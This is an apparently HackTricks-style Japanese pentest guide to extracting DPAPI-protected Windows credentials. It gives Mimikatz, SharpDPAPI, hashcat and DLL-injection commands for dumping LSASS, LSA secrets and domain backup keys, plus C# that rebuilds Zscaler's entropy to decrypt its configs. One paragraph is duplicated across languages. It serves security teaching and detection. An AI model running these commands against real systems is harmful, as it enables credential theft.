# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

The Data Protection API (DPAPI) は、主に Windows オペレーティングシステム内で、**非対称プライベートキーの対称暗号化 (symmetric encryption of asymmetric private keys)** に使用され、ユーザーまたはシステムのシークレットをエントロピーの重要な供給源として利用します。これにより、開発者はユーザーのログオンシークレットから派生したキー、またはシステム暗号化の場合はシステムのドメイン認証シークレットを使用してデータを暗号化できるため、暗号化キーの保護を開発者自身が管理する必要がなくなります。

DPAPI を使用する最も一般的な方法は、**`CryptProtectData` and `CryptUnprotectData`** 関数を通じてで、これらは現在ログオンしているプロセスのセッションでデータを安全に暗号化および復号することを可能にします。つまり、暗号化されたデータはそのデータを暗号化したのと同じユーザーまたはシステムによってのみ復号できます。

さらに、これらの関数は **`entropy` parameter** も受け取り、暗号化と復号の両方で使用されるため、このパラメータを使って暗号化されたものを復号するには、暗号化時に使用されたのと同じ entropy 値を提供する必要があります。

### Users key generation

DPAPI は各ユーザーの資格情報に基づいて固有のキー（**`pre-key`** と呼ばれる）を生成します。このキーはユーザーのパスワードや他の要素から派生し、アルゴリズムはユーザーの種類によって異なりますが最終的には SHA1 になります。例えば、ドメインユーザーの場合、**ユーザーの NTLM ハッシュに依存します**。

これは特に重要で、攻撃者がユーザーのパスワードハッシュを入手できれば、次のことが可能になります:

- そのユーザーのキーで DPAPI を使用して暗号化されたあらゆるデータを **API に問い合わせることなく復号できる**
- 有効な DPAPI キーを生成しようとしてオフラインで **パスワードをクラッキング** することを試みる

さらに、ユーザーが DPAPI を使ってデータを暗号化するたびに、新しい **マスターキー** が生成されます。このマスターキーが実際にデータを暗号化するために使用されるものです。各マスターキーにはそれを識別する **GUID** (Globally Unique Identifier) が付与されます。

マスターキーは **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** ディレクトリに保存されます。ここで `{SID}` はそのユーザーの Security Identifier です。マスターキーはユーザーの **`pre-key`** によって暗号化されて保存されるとともに、リカバリ用に **ドメインバックアップキー** によっても暗号化されます（つまり同じキーが 2 つの異なるパスで 2 回暗号化されて保存されます）。

マスターキーを暗号化するために使用される **ドメインキーはドメインコントローラに存在し変更されない** ことに注意してください。したがって、攻撃者がドメインコントローラにアクセスできれば、ドメインバックアップキーを取得してドメイン内のすべてのユーザーのマスターキーを復号できます。

暗号化されたブロブはヘッダ内に、そのデータを暗号化するために使用された **マスターキーの GUID** を含んでいます。

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### マシン/システムキーの生成

これはマシンがデータを暗号化するために使用するキーです。これは**DPAPI_SYSTEM LSA secret**に基づいており、SYSTEM ユーザーのみがアクセスできる特別なキーです。このキーは、マシンレベルの認証情報やシステム全体で使われるシークレットなど、システム自身がアクセスする必要のあるデータを暗号化するために使われます。

これらのキーは **don't have a domain backup** ため、ローカルでしかアクセスできないことに注意してください：

- **Mimikatz** は LSA シークレットをダンプするコマンドを使用してアクセスできます: `mimikatz lsadump::secrets`
- シークレットはレジストリ内に保存されているため、管理者は **DACL の権限を変更してアクセスする** ことができます。レジストリのパスは: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### DPAPI によって保護されるデータ

DPAPI によって保護される個人データには次のようなものがあります：

- Windows creds
- Internet Explorer と Google Chrome のパスワードおよび自動入力データ
- Outlook や Windows Mail のようなアプリケーションにおけるメールおよび内部 FTP アカウントのパスワード
- 共有フォルダ、リソース、無線ネットワーク、Windows Vault のパスワード（暗号化キーを含む）
- リモートデスクトップ接続、.NET Passport、およびさまざまな暗号化や認証目的のためのプライベートキーのパスワード
- Credential Manager によって管理されるネットワークパスワードや、CryptProtectData を使用するアプリケーション（Skype、MSN messenger など）の個人データ
- レジストリ内の暗号化されたバイナリ (blob)
- ...

システム保護データには以下が含まれます：
- Wifi パスワード
- スケジュールされたタスクのパスワード
- ...

### マスターキー抽出オプション

- ユーザーがドメイン管理者権限を持っている場合、**domain backup key** にアクセスしてドメイン内のすべてのユーザーマスターキーを復号することができます：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- local admin privileges があれば、**LSASS memory にアクセス**して、接続されているすべてのユーザーの DPAPI master keys と SYSTEM key を抽出できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ローカル管理者権限がある場合、ユーザーは**DPAPI_SYSTEM LSA secret**にアクセスしてマシンのマスターキーを復号できます:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのパスワードまたは NTLM ハッシュが分かっている場合、**ユーザーのマスターキーを直接復号できます**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、DCに対して**backup key to decrypt the master keys using RPC**を要求することが可能です。あなたがlocal adminでユーザーがログインしている場合、このために**steal his session token**することができます:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vaultの一覧
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 暗号化データへアクセス

### DPAPI 暗号化データを見つける

一般ユーザーの**保護されたファイル**は次の場所にあります:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスでは、`\Roaming\` を `\Local\` に変更することも確認してください。

列挙の例:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) はファイルシステム、レジストリ、B64 blobs 内の DPAPI 暗号化 blobs を検出できます:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.

### アクセスキーとデータ

- **Use SharpDPAPI** を使って、現在のセッションのDPAPIで暗号化されたファイルから認証情報を取得します:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **credentials info を取得する**: encrypted data や guidMasterKey などの情報を取得する。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeysにアクセス**:

RPCを使用して、**domain backup key**を要求したユーザーのmasterkeyを復号する:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** ツールは masterkey の復号に次の引数も対応しています（`/rpc` でドメインのバックアップキーを取得、`/password` でプレーンテキストのパスワードを使用、`/pvk` で DPAPI ドメインのプライベートキー ファイルを指定できます...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **マスターキーを使用してデータを復号する**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** tool also supports these arguments for `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (note how it's possible to use `/rpc` to get the domains backup key, `/password` to use a plaintext password, `/pvk` to specify a DPAPI domain private key file, `/unprotect` to use current users session...):


The **SharpDPAPI** ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号に対して以下の引数もサポートします（`/rpc` を使ってドメインのバックアップキーを取得したり、`/password` でプレーンテキストのパスワードを使用したり、`/pvk` で DPAPI ドメインの秘密鍵ファイルを指定したり、`/unprotect` で現在のユーザーのセッションを使用したりできる点に注意）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- **現在のユーザーセッション** を使用してデータを復号する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### オプションの entropy ("Third-party entropy") の扱い

一部のアプリケーションは `CryptProtectData` に追加の **entropy** 値を渡します。この値がなければ、正しい masterkey が判明していても blob を復号できません。したがって、この方法で保護された資格情報（例: Microsoft Outlook、いくつかの VPN クライアント）を狙う場合、entropy を取得することが不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) は、ターゲットプロセス内の DPAPI 関数をフックし、提供された任意の entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` のようなプロセスに対して **DLL-injection** モードで EntropyCapture を実行すると、各 entropy バッファを呼び出しプロセスと blob にマッピングしたファイルが出力されます。取得した entropy は後で **SharpDPAPI** (`/entropy:`) や **Mimikatz** (`/entropy:<file>`) に渡してデータを復号することができます。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### オフラインでのマスターキーのクラック (Hashcat & DPAPISnoop)

Microsoftは、Windows 10 v1607 (2016) から **context 3** マスターキー形式を導入しました。`hashcat` v6.2.6 (2023年12月) はハッシュモード **22100** (DPAPI masterkey v1 context)、**22101** (context 1) および **22102** (context 3) を追加し、マスターキー・ファイルからユーザーパスワードを直接GPUでクラックできるようにしました。したがって攻撃者はターゲットシステムに接触することなく、ワードリストやブルートフォース攻撃を行えます。

`DPAPISnoop` (2024) はこのプロセスを自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
このツールはCredential and Vault blobsを解析し、cracked keysで復号してcleartext passwordsをエクスポートすることもできます。

### 他のマシンのデータにアクセス

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Of course you need to be able to access that machine and in the following example it's supposed that the **ドメインのバックアップ暗号化キーが既知である**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は LDAP ディレクトリからすべてのユーザーとコンピュータを抽出し、RPC 経由でドメインコントローラのバックアップキーを抽出する処理を自動化するツールです。スクリプトは抽出したコンピュータの IP アドレスを解決し、すべてのコンピュータに対して smbclient を実行してすべてのユーザーの DPAPI ブロブを取得し、ドメインバックアップキーで全てを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピュータリストがあれば、知らなかったサブネットも含めてすべて見つけられます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は DPAPI で保護されたシークレットを自動的にダンプできます。2.x リリースで導入された機能:

* 数百ホストからのブロブ並列収集
* **context 3** マスターキーの解析と Hashcat による自動クラック連携
* Chrome の "App-Bound" 暗号化クッキーのサポート（次節参照）
* エンドポイントを繰り返しポーリングして新規作成されたブロブを差分検出する新しい **`--snapshot`** モード

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は masterkey/credential/vault ファイル用の C# パーサーで、Hashcat/JtR フォーマットを出力でき、オプションで自動的にクラックを実行できます。Windows 11 24H1 までの machine と user のマスターキー形式を完全にサポートします。


## 一般的な検知

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` やその他の DPAPI 関連ディレクトリへのファイルアクセス。
- 特に **C$** や **ADMIN$** のようなネットワーク共有から。
- LSASS メモリにアクセスしたりマスターキーをダンプするための **Mimikatz**、**SharpDPAPI** 等のツールの使用。
- イベント **4662**: *オブジェクトに対して操作が行われました* – **`BCKUPKEY`** オブジェクトへのアクセスと相関する可能性があります。
- イベント **4673/4674**: プロセスが *SeTrustedCredManAccessPrivilege*（Credential Manager）を要求したとき

---
### 2023–2025 の脆弱性とエコシステムの変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023年11月)。ネットワークアクセスを持つ攻撃者がドメインメンバーを欺いて悪意ある DPAPI バックアップキーを取得させ、ユーザーマスターキーを復号できる可能性がありました。2023年11月の累積アップデートで修正済み — 管理者は DC およびワークステーションが完全にパッチ適用されていることを確認してください。
* **Chrome 127 “App-Bound” cookie encryption** (2024年7月) は従来の DPAPI のみの保護に代わり、ユーザーの **Credential Manager** に格納された追加のキーを導入しました。クッキーのオフライン復号には現在、DPAPI マスターキーと **GCM-wrapped app-bound key** の両方が必要です。SharpChrome v2.3 および DonPAPI 2.x は、ユーザーコンテキストで実行すると追加キーを回復できます。


### 事例: Zscaler Client Connector – SID から導出されるカスタムエントロピー

Zscaler Client Connector は `C:\ProgramData\Zscaler` に複数の設定ファイル（例: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`）を保存します。各ファイルは **DPAPI (Machine scope)** で暗号化されていますが、ベンダーはディスクに保存する代わりに実行時に*計算される* **custom entropy** を提供します。

エントロピーは次の2要素から再構築されます:

1. `ZSACredentialProvider.dll` に埋め込まれたハードコードされたシークレット。
2. 設定が属する Windows アカウントの **SID**。

DLL によって実装されているアルゴリズムは次と等価です:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
秘密はディスクから読み取れるDLLに埋め込まれているため、**SYSTEM権限を持つ任意のローカル攻撃者は任意のSIDのエントロピーを再生成でき**、blobsをオフラインで復号できます:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption yields the complete JSON configuration, including every **device posture check** and its expected value – information that is very valuable when attempting client-side bypasses.

> TIP: the other encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) are protected with DPAPI **without** entropy (`16` zero bytes). They can therefore be decrypted directly with `ProtectedData.Unprotect` once SYSTEM privileges are obtained.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
